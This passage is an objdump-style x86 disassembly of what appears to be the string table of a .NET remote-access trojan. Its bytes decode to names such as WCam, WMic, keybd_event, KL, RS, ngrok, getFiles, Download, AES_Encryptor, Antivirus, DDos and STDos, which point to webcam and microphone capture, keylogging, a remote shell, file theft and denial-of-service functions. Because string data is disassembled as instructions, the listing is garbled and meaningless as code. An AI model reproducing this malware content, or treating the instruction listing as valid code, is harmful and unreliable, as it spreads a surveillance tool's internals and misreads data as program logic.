  4087d5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4087d8:	73 69                	jae    0x408843
  4087da:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  4087de:	70 65                	jo     0x408845
  4087e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4087e1:	64 4f                	fs dec %edi
  4087e3:	75 74                	jne    0x408859
  4087e5:	70 75                	jo     0x40885c
  4087e7:	74 54                	je     0x40883d
  4087e9:	65 78 74             	gs js  0x408860
  4087ec:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  4087f0:	74 00                	je     0x4087f2
  4087f2:	44                   	inc    %esp
  4087f3:	61                   	popa
  4087f4:	74 61                	je     0x408857
  4087f6:	52                   	push   %edx
  4087f7:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4087fb:	76 65                	jbe    0x408862
  4087fd:	64 45                	fs inc %ebp
  4087ff:	76 65                	jbe    0x408866
  408801:	6e                   	outsb  %ds:(%esi),(%dx)
  408802:	74 41                	je     0x408845
  408804:	72 67                	jb     0x40886d
  408806:	73 00                	jae    0x408808
  408808:	4d                   	dec    %ebp
  408809:	79 50                	jns    0x40885b
  40880b:	72 6f                	jb     0x40887c
  40880d:	63 65 73             	arpl   %esp,0x73(%ebp)
  408810:	73 5f                	jae    0x408871
  408812:	45                   	inc    %ebp
  408813:	72 72                	jb     0x408887
  408815:	6f                   	outsl  %ds:(%esi),(%dx)
  408816:	72 44                	jb     0x40885c
  408818:	61                   	popa
  408819:	74 61                	je     0x40887c
  40881b:	52                   	push   %edx
  40881c:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408820:	76 65                	jbe    0x408887
  408822:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  408826:	6e                   	outsb  %ds:(%esi),(%dx)
  408827:	64 65 72 00          	fs gs jb 0x40882b
  40882b:	65 00 4d 79          	add    %cl,%gs:0x79(%ebp)
  40882f:	50                   	push   %eax
  408830:	72 6f                	jb     0x4088a1
  408832:	63 65 73             	arpl   %esp,0x73(%ebp)
  408835:	73 5f                	jae    0x408896
  408837:	4f                   	dec    %edi
  408838:	75 74                	jne    0x4088ae
  40883a:	70 75                	jo     0x4088b1
  40883c:	74 44                	je     0x408882
  40883e:	61                   	popa
  40883f:	74 61                	je     0x4088a2
  408841:	52                   	push   %edx
  408842:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408846:	76 65                	jbe    0x4088ad
  408848:	64 00 57 43          	add    %dl,%fs:0x43(%edi)
  40884c:	61                   	popa
  40884d:	6d                   	insl   (%dx),%es:(%edi)
  40884e:	00 57 4d             	add    %dl,0x4d(%edi)
  408851:	69 63 00 57 53 6f 75 	imul   $0x756f5357,0x0(%ebx),%esp
  408858:	6e                   	outsb  %ds:(%esi),(%dx)
  408859:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40885d:	61                   	popa
  40885e:	64 00 6d 6f          	add    %ch,%fs:0x6f(%ebp)
  408862:	75 73                	jne    0x4088d7
  408864:	65 5f                	gs pop %edi
  408866:	65 76 65             	gs jbe 0x4088ce
  408869:	6e                   	outsb  %ds:(%esi),(%dx)
  40886a:	74 00                	je     0x40886c
  40886c:	64 77 46             	fs ja  0x4088b5
  40886f:	6c                   	insb   (%dx),%es:(%edi)
  408870:	61                   	popa
  408871:	67 73 00             	addr16 jae 0x408874
  408874:	64 78 00             	fs js  0x408877
  408877:	64 79 00             	fs jns 0x40887a
  40887a:	63 42 75             	arpl   %eax,0x75(%edx)
  40887d:	74 74                	je     0x4088f3
  40887f:	6f                   	outsl  %ds:(%esi),(%dx)
  408880:	6e                   	outsb  %ds:(%esi),(%dx)
  408881:	73 00                	jae    0x408883
  408883:	64 77 45             	fs ja  0x4088cb
  408886:	78 74                	js     0x4088fc
  408888:	72 61                	jb     0x4088eb
  40888a:	49                   	dec    %ecx
  40888b:	6e                   	outsb  %ds:(%esi),(%dx)
  40888c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40888e:	00 75 73             	add    %dh,0x73(%ebp)
  408891:	65 72 33             	gs jb  0x4088c7
  408894:	32 00                	xor    (%eax),%al
  408896:	6b 65 79 62          	imul   $0x62,0x79(%ebp),%esp
  40889a:	64 5f                	fs pop %edi
  40889c:	65 76 65             	gs jbe 0x408904
  40889f:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a0:	74 00                	je     0x4088a2
  4088a2:	62 56 6b             	bound  %edx,0x6b(%esi)
  4088a5:	00 62 53             	add    %ah,0x53(%edx)
  4088a8:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  4088ab:	00 6e 67             	add    %ch,0x67(%esi)
  4088ae:	72 6f                	jb     0x40891f
  4088b0:	6b 00 52             	imul   $0x52,(%eax),%eax
  4088b3:	53                   	push   %ebx
  4088b4:	00 54 68 72          	add    %dl,0x72(%eax,%ebp,2)
  4088b8:	65 61                	gs popa
  4088ba:	64 00 4b 4c          	add    %cl,%fs:0x4c(%ebx)
  4088be:	00 63 61             	add    %ah,0x61(%ebx)
  4088c1:	70 43                	jo     0x408906
  4088c3:	72 65                	jb     0x40892a
  4088c5:	61                   	popa
  4088c6:	74 65                	je     0x40892d
  4088c8:	43                   	inc    %ebx
  4088c9:	61                   	popa
  4088ca:	70 74                	jo     0x408940
  4088cc:	75 72                	jne    0x408940
  4088ce:	65 57                	gs push %edi
  4088d0:	69 6e 64 6f 77 41 00 	imul   $0x41776f,0x64(%esi),%ebp
  4088d7:	6c                   	insb   (%dx),%es:(%edi)
  4088d8:	70 73                	jo     0x40894d
  4088da:	7a 57                	jp     0x408933
  4088dc:	69 6e 64 6f 77 4e 61 	imul   $0x614e776f,0x64(%esi),%ebp
  4088e3:	6d                   	insl   (%dx),%es:(%edi)
  4088e4:	65 00 64 77 53       	add    %ah,%gs:0x53(%edi,%esi,2)
  4088e9:	74 79                	je     0x408964
  4088eb:	6c                   	insb   (%dx),%es:(%edi)
  4088ec:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  4088f0:	59                   	pop    %ecx
  4088f1:	00 6e 57             	add    %ch,0x57(%esi)
  4088f4:	69 64 74 68 00 6e 48 	imul   $0x65486e00,0x68(%esp,%esi,2),%esp
  4088fb:	65 
  4088fc:	69 67 68 74 00 68 77 	imul   $0x77680074,0x68(%edi),%esp
  408903:	6e                   	outsb  %ds:(%esi),(%dx)
  408904:	64 50                	fs push %eax
  408906:	61                   	popa
  408907:	72 65                	jb     0x40896e
  408909:	6e                   	outsb  %ds:(%esi),(%dx)
  40890a:	74 00                	je     0x40890c
  40890c:	6e                   	outsb  %ds:(%esi),(%dx)
  40890d:	49                   	dec    %ecx
  40890e:	44                   	inc    %esp
  40890f:	00 48 61             	add    %cl,0x61(%eax)
  408912:	6e                   	outsb  %ds:(%esi),(%dx)
  408913:	64 6c                	fs insb (%dx),%es:(%edi)
  408915:	65 00 63 61          	add    %ah,%gs:0x61(%ebx)
  408919:	70 47                	jo     0x408962
  40891b:	65 74 44             	gs je  0x408962
  40891e:	72 69                	jb     0x408989
  408920:	76 65                	jbe    0x408987
  408922:	72 44                	jb     0x408968
  408924:	65 73 63             	gs jae 0x40898a
  408927:	72 69                	jb     0x408992
  408929:	70 74                	jo     0x40899f
  40892b:	69 6f 6e 41 00 77 44 	imul   $0x44770041,0x6e(%edi),%ebp
  408932:	72 69                	jb     0x40899d
  408934:	76 65                	jbe    0x40899b
  408936:	72 00                	jb     0x408938
  408938:	6c                   	insb   (%dx),%es:(%edi)
  408939:	70 73                	jo     0x4089ae
  40893b:	7a 4e                	jp     0x40898b
  40893d:	61                   	popa
  40893e:	6d                   	insl   (%dx),%es:(%edi)
  40893f:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  408943:	4e                   	dec    %esi
  408944:	61                   	popa
  408945:	6d                   	insl   (%dx),%es:(%edi)
  408946:	65 00 6c 70 73       	add    %ch,%gs:0x73(%eax,%esi,2)
  40894b:	7a 56                	jp     0x4089a3
  40894d:	65 72 00             	gs jb  0x408950
  408950:	63 62 56             	arpl   %esp,0x56(%edx)
  408953:	65 72 00             	gs jb  0x408956
  408956:	43                   	inc    %ebx
  408957:	61                   	popa
  408958:	6d                   	insl   (%dx),%es:(%edi)
  408959:	00 4e 65             	add    %cl,0x65(%esi)
  40895c:	74 33                	je     0x408991
  40895e:	00 67 65             	add    %ah,0x65(%edi)
  408961:	74 46                	je     0x4089a9
  408963:	6f                   	outsl  %ds:(%esi),(%dx)
  408964:	6c                   	insb   (%dx),%es:(%edi)
  408965:	64 65 72 73          	fs gs jb 0x4089dc
  408969:	00 6c 6f 63          	add    %ch,0x63(%edi,%ebp,2)
  40896d:	61                   	popa
  40896e:	74 69                	je     0x4089d9
  408970:	6f                   	outsl  %ds:(%esi),(%dx)
  408971:	6e                   	outsb  %ds:(%esi),(%dx)
  408972:	00 67 65             	add    %ah,0x65(%edi)
  408975:	74 46                	je     0x4089bd
  408977:	69 6c 65 73 00 67 65 	imul   $0x74656700,0x73(%ebp,%eiz,2),%ebp
  40897e:	74 
  40897f:	44                   	inc    %esp
  408980:	72 69                	jb     0x4089eb
  408982:	76 65                	jbe    0x4089e9
  408984:	73 00                	jae    0x408986
  408986:	44                   	inc    %esp
  408987:	6f                   	outsl  %ds:(%esi),(%dx)
  408988:	77 6e                	ja     0x4089f8
  40898a:	6c                   	insb   (%dx),%es:(%edi)
  40898b:	6f                   	outsl  %ds:(%esi),(%dx)
  40898c:	61                   	popa
  40898d:	64 00 4e 61          	add    %cl,%fs:0x61(%esi)
  408991:	6d                   	insl   (%dx),%es:(%edi)
  408992:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  408997:	61                   	popa
  408998:	00 4d 79             	add    %cl,0x79(%ebp)
  40899b:	50                   	push   %eax
  40899c:	72 6f                	jb     0x408a0d
  40899e:	63 65 73             	arpl   %esp,0x73(%ebp)
  4089a1:	73 00                	jae    0x4089a3
  4089a3:	53                   	push   %ebx
  4089a4:	42                   	inc    %edx
  4089a5:	00 73 00             	add    %dh,0x0(%ebx)
  4089a8:	42                   	inc    %edx
  4089a9:	53                   	push   %ebx
  4089aa:	00 49 44             	add    %cl,0x44(%ecx)
  4089ad:	00 47 65             	add    %al,0x65(%edi)
  4089b0:	74 48                	je     0x4089fa
  4089b2:	61                   	popa
  4089b3:	73 68                	jae    0x408a1d
  4089b5:	54                   	push   %esp
  4089b6:	00 73 74             	add    %dh,0x74(%ebx)
  4089b9:	72 54                	jb     0x408a0f
  4089bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4089bc:	48                   	dec    %eax
  4089bd:	61                   	popa
  4089be:	73 68                	jae    0x408a28
  4089c0:	00 66 72             	add    %ah,0x72(%esi)
  4089c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4089c4:	6d                   	insl   (%dx),%es:(%edi)
  4089c5:	62 61 73             	bound  %esp,0x73(%ecx)
  4089c8:	65 36 34 00          	gs ss xor $0x0,%al
  4089cc:	62 73 36             	bound  %esi,0x36(%ebx)
  4089cf:	34 00                	xor    $0x0,%al
  4089d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d2:	62 6a 6a             	bound  %ebp,0x6a(%edx)
  4089d5:	00 62 79             	add    %ah,0x79(%edx)
  4089d8:	74 00                	je     0x4089da
  4089da:	50                   	push   %eax
  4089db:	6c                   	insb   (%dx),%es:(%edi)
  4089dc:	75 67                	jne    0x408a45
  4089de:	69 6e 00 63 00 41 45 	imul   $0x45410063,0x0(%esi),%ebp
  4089e5:	53                   	push   %ebx
  4089e6:	5f                   	pop    %edi
  4089e7:	45                   	inc    %ebp
  4089e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e9:	63 72 79             	arpl   %esi,0x79(%edx)
  4089ec:	70 74                	jo     0x408a62
  4089ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ef:	72 00                	jb     0x4089f1
  4089f1:	69 6e 70 75 74 00 41 	imul   $0x41007475,0x70(%esi),%ebp
  4089f8:	45                   	inc    %ebp
  4089f9:	53                   	push   %ebx
  4089fa:	5f                   	pop    %edi
  4089fb:	44                   	inc    %esp
  4089fc:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408a00:	70 74                	jo     0x408a76
  408a02:	6f                   	outsl  %ds:(%esi),(%dx)
  408a03:	72 00                	jb     0x408a05
  408a05:	49                   	dec    %ecx
  408a06:	4e                   	dec    %esi
  408a07:	44                   	inc    %esp
  408a08:	41                   	inc    %ecx
  408a09:	54                   	push   %esp
  408a0a:	45                   	inc    %ebp
  408a0b:	00 75 73             	add    %dh,0x73(%ebp)
  408a0e:	62 70 00             	bound  %esi,0x0(%eax)
  408a11:	61                   	popa
  408a12:	64 6d                	fs insl (%dx),%es:(%edi)
  408a14:	69 6e 00 43 6f 6d 6d 	imul   $0x6d6d6f43,0x0(%esi),%ebp
  408a1b:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a1d:	74 00                	je     0x408a1f
  408a1f:	41                   	inc    %ecx
  408a20:	6e                   	outsb  %ds:(%esi),(%dx)
  408a21:	74 69                	je     0x408a8c
  408a23:	76 69                	jbe    0x408a8e
  408a25:	72 75                	jb     0x408a9c
  408a27:	73 00                	jae    0x408a29
  408a29:	43                   	inc    %ebx
  408a2a:	72 65                	jb     0x408a91
  408a2c:	61                   	popa
  408a2d:	74 65                	je     0x408a94
  408a2f:	4d                   	dec    %ebp
  408a30:	75 74                	jne    0x408aa6
  408a32:	65 78 00             	gs js  0x408a35
  408a35:	43                   	inc    %ebx
  408a36:	6c                   	insb   (%dx),%es:(%edi)
  408a37:	6f                   	outsl  %ds:(%esi),(%dx)
  408a38:	73 65                	jae    0x408a9f
  408a3a:	4d                   	dec    %ebp
  408a3b:	75 74                	jne    0x408ab1
  408a3d:	65 78 00             	gs js  0x408a40
  408a40:	75 73                	jne    0x408ab5
  408a42:	65 72 41             	gs jb  0x408a86
  408a45:	67 65 6e             	outsb  %gs:(%si),(%dx)
  408a48:	74 73                	je     0x408abd
  408a4a:	00 49 50             	add    %cl,0x50(%ecx)
  408a4d:	48                   	dec    %eax
  408a4e:	4f                   	dec    %edi
  408a4f:	53                   	push   %ebx
  408a50:	54                   	push   %esp
  408a51:	00 50 6f             	add    %dl,0x6f(%eax)
  408a54:	72 74                	jb     0x408aca
  408a56:	48                   	dec    %eax
  408a57:	6f                   	outsl  %ds:(%esi),(%dx)
  408a58:	73 74                	jae    0x408ace
  408a5a:	00 44 44 6f          	add    %al,0x6f(%esp,%eax,2)
  408a5e:	73 00                	jae    0x408a60
  408a60:	53                   	push   %ebx
  408a61:	54                   	push   %esp
  408a62:	44                   	inc    %esp
  408a63:	6f                   	outsl  %ds:(%esi),(%dx)
  408a64:	73 00                	jae    0x408a66
  408a66:	49                   	dec    %ecx
  408a67:	73 56                	jae    0x408abf
  408a69:	61                   	popa
  408a6a:	6c                   	insb   (%dx),%es:(%edi)
  408a6b:	69 64 00 41 64 64 72 	imul   $0x65726464,0x41(%eax,%eax,1),%esp
  408a72:	65 
  408a73:	73 73                	jae    0x408ae8
  408a75:	00 42 69             	add    %al,0x69(%edx)
  408a78:	74 42                	je     0x408abc
  408a7a:	6c                   	insb   (%dx),%es:(%edi)
  408a7b:	74 00                	je     0x408a7d
  408a7d:	68 64 63 00 6e       	push   $0x6e006364
  408a82:	58                   	pop    %eax
  408a83:	44                   	inc    %esp
  408a84:	65 73 74             	gs jae 0x408afb
  408a87:	00 6e 59             	add    %ch,0x59(%esi)
  408a8a:	44                   	inc    %esp
  408a8b:	65 73 74             	gs jae 0x408b02
  408a8e:	00 68 64             	add    %ch,0x64(%eax)
  408a91:	63 53 72             	arpl   %edx,0x72(%ebx)
  408a94:	63 00                	arpl   %eax,(%eax)
  408a96:	6e                   	outsb  %ds:(%esi),(%dx)
  408a97:	58                   	pop    %eax
  408a98:	53                   	push   %ebx
  408a99:	72 63                	jb     0x408afe
  408a9b:	00 6e 59             	add    %ch,0x59(%esi)
  408a9e:	53                   	push   %ebx
  408a9f:	72 63                	jb     0x408b04
  408aa1:	00 64 77 52          	add    %ah,0x52(%edi,%esi,2)
  408aa5:	6f                   	outsl  %ds:(%esi),(%dx)
  408aa6:	70 00                	jo     0x408aa8
  408aa8:	67 64 69 33 32 2e 64 	imul   $0x6c642e32,%fs:(%bp,%di),%esi
  408aaf:	6c 
  408ab0:	6c                   	insb   (%dx),%es:(%edi)
  408ab1:	00 53 79             	add    %dl,0x79(%ebx)
  408ab4:	73 74                	jae    0x408b2a
  408ab6:	65 6d                	gs insl (%dx),%es:(%edi)
  408ab8:	2e 44                	cs inc %esp
  408aba:	72 61                	jb     0x408b1d
  408abc:	77 69                	ja     0x408b27
  408abe:	6e                   	outsb  %ds:(%esi),(%dx)
  408abf:	67 00 53 69          	add    %dl,0x69(%bp,%di)
  408ac3:	7a 65                	jp     0x408b2a
  408ac5:	00 43 61             	add    %al,0x61(%ebx)
  408ac8:	70 74                	jo     0x408b3e
  408aca:	75 72                	jne    0x408b3e
  408acc:	65 00 73 69          	add    %dh,%gs:0x69(%ebx)
  408ad0:	7a 65                	jp     0x408b37
  408ad2:	00 51 00             	add    %dl,0x0(%ecx)
  408ad5:	53                   	push   %ebx
  408ad6:	79 73                	jns    0x408b4b
  408ad8:	74 65                	je     0x408b3f
  408ada:	6d                   	insl   (%dx),%es:(%edi)
  408adb:	2e 44                	cs inc %esp
  408add:	72 61                	jb     0x408b40
  408adf:	77 69                	ja     0x408b4a
  408ae1:	6e                   	outsb  %ds:(%esi),(%dx)
  408ae2:	67 2e 49             	addr16 cs dec %ecx
  408ae5:	6d                   	insl   (%dx),%es:(%edi)
  408ae6:	61                   	popa
  408ae7:	67 69 6e 67 00 49 6d 	imul   $0x616d4900,0x67(%bp),%ebp
  408aee:	61 
  408aef:	67 65 43             	addr16 gs inc %ebx
  408af2:	6f                   	outsl  %ds:(%esi),(%dx)
  408af3:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408af8:	66 6f                	outsw  %ds:(%esi),(%dx)
  408afa:	00 47 65             	add    %al,0x65(%edi)
  408afd:	74 45                	je     0x408b44
  408aff:	6e                   	outsb  %ds:(%esi),(%dx)
  408b00:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408b03:	65 72 49             	gs jb  0x408b4f
  408b06:	6e                   	outsb  %ds:(%esi),(%dx)
  408b07:	66 6f                	outsw  %ds:(%esi),(%dx)
  408b09:	00 4d 00             	add    %cl,0x0(%ebp)
  408b0c:	4d                   	dec    %ebp
  408b0d:	75 6c                	jne    0x408b7b
  408b0f:	74 69                	je     0x408b7a
  408b11:	63 61 73             	arpl   %esp,0x73(%ecx)
  408b14:	74 44                	je     0x408b5a
  408b16:	65 6c                	gs insb (%dx),%es:(%edi)
  408b18:	65 67 61             	gs addr16 popa
  408b1b:	74 65                	je     0x408b82
  408b1d:	00 54 61 72          	add    %dl,0x72(%ecx,%eiz,2)
  408b21:	67 65 74 4f          	addr16 gs je 0x408b74
  408b25:	62 6a 65             	bound  %ebp,0x65(%edx)
  408b28:	63 74 00 54          	arpl   %esi,0x54(%eax,%eax,1)
  408b2c:	61                   	popa
  408b2d:	72 67                	jb     0x408b96
  408b2f:	65 74 4d             	gs je  0x408b7f
  408b32:	65 74 68             	gs je  0x408b9d
  408b35:	6f                   	outsl  %ds:(%esi),(%dx)
  408b36:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  408b3a:	79 6e                	jns    0x408baa
  408b3c:	63 43 61             	arpl   %eax,0x61(%ebx)
  408b3f:	6c                   	insb   (%dx),%es:(%edi)
  408b40:	6c                   	insb   (%dx),%es:(%edi)
  408b41:	62 61 63             	bound  %esp,0x63(%ecx)
  408b44:	6b 00 42             	imul   $0x42,(%eax),%eax
  408b47:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  408b4e:	6f 6b 
  408b50:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408b55:	65 67 61             	gs addr16 popa
  408b58:	74 65                	je     0x408bbf
  408b5a:	43                   	inc    %ebx
  408b5b:	61                   	popa
  408b5c:	6c                   	insb   (%dx),%es:(%edi)
  408b5d:	6c                   	insb   (%dx),%es:(%edi)
  408b5e:	62 61 63             	bound  %esp,0x63(%ecx)
  408b61:	6b 00 44             	imul   $0x44,(%eax),%eax
  408b64:	65 6c                	gs insb (%dx),%es:(%edi)
  408b66:	65 67 61             	gs addr16 popa
  408b69:	74 65                	je     0x408bd0
  408b6b:	41                   	inc    %ecx
  408b6c:	73 79                	jae    0x408be7
  408b6e:	6e                   	outsb  %ds:(%esi),(%dx)
  408b6f:	63 53 74             	arpl   %edx,0x74(%ebx)
  408b72:	61                   	popa
  408b73:	74 65                	je     0x408bda
  408b75:	00 45 6e             	add    %al,0x6e(%ebp)
  408b78:	64 49                	fs dec %ecx
  408b7a:	6e                   	outsb  %ds:(%esi),(%dx)
  408b7b:	76 6f                	jbe    0x408bec
  408b7d:	6b 65 00 44          	imul   $0x44,0x0(%ebp),%esp
  408b81:	65 6c                	gs insb (%dx),%es:(%edi)
  408b83:	65 67 61             	gs addr16 popa
  408b86:	74 65                	je     0x408bed
  408b88:	41                   	inc    %ecx
  408b89:	73 79                	jae    0x408c04
  408b8b:	6e                   	outsb  %ds:(%esi),(%dx)
  408b8c:	63 52 65             	arpl   %edx,0x65(%edx)
  408b8f:	73 75                	jae    0x408c06
  408b91:	6c                   	insb   (%dx),%es:(%edi)
  408b92:	74 00                	je     0x408b94
  408b94:	49                   	dec    %ecx
  408b95:	6e                   	outsb  %ds:(%esi),(%dx)
  408b96:	76 6f                	jbe    0x408c07
  408b98:	6b 65 00 53          	imul   $0x53,0x0(%ebp),%esp
  408b9c:	79 73                	jns    0x408c11
  408b9e:	74 65                	je     0x408c05
  408ba0:	6d                   	insl   (%dx),%es:(%edi)
  408ba1:	2e 43                	cs inc %ebx
  408ba3:	6f                   	outsl  %ds:(%esi),(%dx)
  408ba4:	6d                   	insl   (%dx),%es:(%edi)
  408ba5:	70 6f                	jo     0x408c16
  408ba7:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba8:	65 6e                	outsb  %gs:(%esi),(%dx)
  408baa:	74 4d                	je     0x408bf9
  408bac:	6f                   	outsl  %ds:(%esi),(%dx)
  408bad:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  408bb0:	00 45 64             	add    %al,0x64(%ebp)
  408bb3:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  408bba:	77 
  408bbb:	73 61                	jae    0x408c1e
  408bbd:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408bc1:	74 74                	je     0x408c37
  408bc3:	72 69                	jb     0x408c2e
  408bc5:	62 75 74             	bound  %esi,0x74(%ebp)
  408bc8:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  408bcc:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  408bd3:	77 
  408bd4:	73 61                	jae    0x408c37
  408bd6:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  408bda:	74 61                	je     0x408c3d
  408bdc:	74 65                	je     0x408c43
  408bde:	00 53 79             	add    %dl,0x79(%ebx)
  408be1:	73 74                	jae    0x408c57
  408be3:	65 6d                	gs insl (%dx),%es:(%edi)
  408be5:	2e 43                	cs inc %ebx
  408be7:	6f                   	outsl  %ds:(%esi),(%dx)
  408be8:	64 65 44             	fs gs inc %esp
  408beb:	6f                   	outsl  %ds:(%esi),(%dx)
  408bec:	6d                   	insl   (%dx),%es:(%edi)
  408bed:	2e 43                	cs inc %ebx
  408bef:	6f                   	outsl  %ds:(%esi),(%dx)
  408bf0:	6d                   	insl   (%dx),%es:(%edi)
  408bf1:	70 69                	jo     0x408c5c
  408bf3:	6c                   	insb   (%dx),%es:(%edi)
  408bf4:	65 72 00             	gs jb  0x408bf7
  408bf7:	47                   	inc    %edi
  408bf8:	65 6e                	outsb  %gs:(%esi),(%dx)
  408bfa:	65 72 61             	gs jb  0x408c5e
  408bfd:	74 65                	je     0x408c64
  408bff:	64 43                	fs inc %ebx
  408c01:	6f                   	outsl  %ds:(%esi),(%dx)
  408c02:	64 65 41             	fs gs inc %ecx
  408c05:	74 74                	je     0x408c7b
  408c07:	72 69                	jb     0x408c72
  408c09:	62 75 74             	bound  %esi,0x74(%ebp)
  408c0c:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408c11:	75 67                	jne    0x408c7a
  408c13:	67 65 72 48          	addr16 gs jb 0x408c5f
  408c17:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  408c1e:	74 
  408c1f:	72 69                	jb     0x408c8a
  408c21:	62 75 74             	bound  %esi,0x74(%ebp)
  408c24:	65 00 4d 69          	add    %cl,%gs:0x69(%ebp)
  408c28:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408c2b:	73 6f                	jae    0x408c9c
  408c2d:	66 74 2e             	data16 je 0x408c5e
  408c30:	56                   	push   %esi
  408c31:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408c38:	73 69                	jae    0x408ca3
  408c3a:	63 2e                	arpl   %ebp,(%esi)
  408c3c:	43                   	inc    %ebx
  408c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  408c3e:	6d                   	insl   (%dx),%es:(%edi)
  408c3f:	70 69                	jo     0x408caa
  408c41:	6c                   	insb   (%dx),%es:(%edi)
  408c42:	65 72 53             	gs jb  0x408c98
  408c45:	65 72 76             	gs jb  0x408cbe
  408c48:	69 63 65 73 00 53 74 	imul   $0x74530073,0x65(%ebx),%esp
  408c4f:	61                   	popa
  408c50:	6e                   	outsb  %ds:(%esi),(%dx)
  408c51:	64 61                	fs popa
  408c53:	72 64                	jb     0x408cb9
  408c55:	4d                   	dec    %ebp
  408c56:	6f                   	outsl  %ds:(%esi),(%dx)
  408c57:	64 75 6c             	fs jne 0x408cc6
  408c5a:	65 41                	gs inc %ecx
  408c5c:	74 74                	je     0x408cd2
  408c5e:	72 69                	jb     0x408cc9
  408c60:	62 75 74             	bound  %esi,0x74(%ebp)
  408c63:	65 00 48 69          	add    %cl,%gs:0x69(%eax)
  408c67:	64 65 4d             	fs gs dec %ebp
  408c6a:	6f                   	outsl  %ds:(%esi),(%dx)
  408c6b:	64 75 6c             	fs jne 0x408cda
  408c6e:	65 4e                	gs dec %esi
  408c70:	61                   	popa
  408c71:	6d                   	insl   (%dx),%es:(%edi)
  408c72:	65 41                	gs inc %ecx
  408c74:	74 74                	je     0x408cea
  408c76:	72 69                	jb     0x408ce1
  408c78:	62 75 74             	bound  %esi,0x74(%ebp)
  408c7b:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  408c7f:	73 74                	jae    0x408cf5
  408c81:	65 6d                	gs insl (%dx),%es:(%edi)
  408c83:	2e 43                	cs inc %ebx
  408c85:	6f                   	outsl  %ds:(%esi),(%dx)
  408c86:	6d                   	insl   (%dx),%es:(%edi)
  408c87:	70 6f                	jo     0x408cf8
  408c89:	6e                   	outsb  %ds:(%esi),(%dx)
  408c8a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c8c:	74 4d                	je     0x408cdb
  408c8e:	6f                   	outsl  %ds:(%esi),(%dx)
  408c8f:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  408c92:	2e 44                	cs inc %esp
  408c94:	65 73 69             	gs jae 0x408d00
  408c97:	67 6e                	outsb  %ds:(%si),(%dx)
  408c99:	00 48 65             	add    %cl,0x65(%eax)
  408c9c:	6c                   	insb   (%dx),%es:(%edi)
  408c9d:	70 4b                	jo     0x408cea
  408c9f:	65 79 77             	gs jns 0x408d19
  408ca2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ca3:	72 64                	jb     0x408d09
  408ca5:	41                   	inc    %ecx
  408ca6:	74 74                	je     0x408d1c
  408ca8:	72 69                	jb     0x408d13
  408caa:	62 75 74             	bound  %esi,0x74(%ebp)
  408cad:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  408cb1:	73 74                	jae    0x408d27
  408cb3:	65 6d                	gs insl (%dx),%es:(%edi)
  408cb5:	2e 52                	cs push %edx
  408cb7:	75 6e                	jne    0x408d27
  408cb9:	74 69                	je     0x408d24
  408cbb:	6d                   	insl   (%dx),%es:(%edi)
  408cbc:	65 2e 43             	gs cs inc %ebx
  408cbf:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc0:	6d                   	insl   (%dx),%es:(%edi)
  408cc1:	70 69                	jo     0x408d2c
  408cc3:	6c                   	insb   (%dx),%es:(%edi)
  408cc4:	65 72 53             	gs jb  0x408d1a
  408cc7:	65 72 76             	gs jb  0x408d40
  408cca:	69 63 65 73 00 52 75 	imul   $0x75520073,0x65(%ebx),%esp
  408cd1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd2:	74 69                	je     0x408d3d
  408cd4:	6d                   	insl   (%dx),%es:(%edi)
  408cd5:	65 48                	gs dec %eax
  408cd7:	65 6c                	gs insb (%dx),%es:(%edi)
  408cd9:	70 65                	jo     0x408d40
  408cdb:	72 73                	jb     0x408d50
  408cdd:	00 47 65             	add    %al,0x65(%edi)
  408ce0:	74 4f                	je     0x408d31
  408ce2:	62 6a 65             	bound  %ebp,0x65(%edx)
  408ce5:	63 74 56 61          	arpl   %esi,0x61(%esi,%edx,2)
  408ce9:	6c                   	insb   (%dx),%es:(%edi)
  408cea:	75 65                	jne    0x408d51
  408cec:	00 52 75             	add    %dl,0x75(%edx)
  408cef:	6e                   	outsb  %ds:(%esi),(%dx)
